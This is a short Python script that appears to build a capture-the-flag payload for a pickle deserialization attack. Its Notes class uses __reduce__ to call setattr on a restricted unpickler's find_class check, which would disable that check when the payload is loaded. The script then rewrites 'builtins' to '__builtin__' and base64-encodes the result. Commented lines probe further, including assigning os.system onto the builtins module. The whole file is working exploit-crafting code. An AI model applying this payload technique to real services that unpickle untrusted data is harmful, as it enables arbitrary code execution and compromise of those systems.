import base64
import pickle
import os
import sys
import builtins as __builtin__


class RestrictedUnpickler(pickle.Unpickler):
  def find_class(self, module, name):
    return super().find_class(module, name)

class Notes(object):
  name = ""
  notes = []
  def __reduce__(self):
    return setattr, (RestrictedUnpickler, 'find_class', )


print(dir(RestrictedUnpickler.__weakref__.__objclass__))
print(locals()['pickle'])
# __builtin__.setattr(__builtin__, 'system', os.system)

# save = pickle.loads(base64.b64decode('Y2NvcHlfcmVnCl9yZWNvbnN0cnVjdG9yCnAwCihjX19tYWluX18KTm90ZXMKcDEKY19fYnVpbHRpbl9fCm9iamVjdApwMgpOdHAzClJwNAooZHA1ClZuYW1lCnA2ClZNeSBub3RlcwpwNwpzVm5vdGVzCnA4CihscDkKVmxpcHN1bQpwMTAKYXNiLg=='))

# print(save.notes, save.name, save)
# __builtin__.input("as")
# print(dir, globals)


notes = Notes()
prick = pickle.dumps(notes)

# fuck the python 2.x red herring
prick = prick.replace(b'builtins', b'__builtin__')
# prick = prick.replace(b'builtins', b'__builtin__')


prickEnc = base64.b64encode(prick)

print(prick)
print(prickEnc)
# print(prick, prickEnc)
# print(pickle.loads(prick).name)
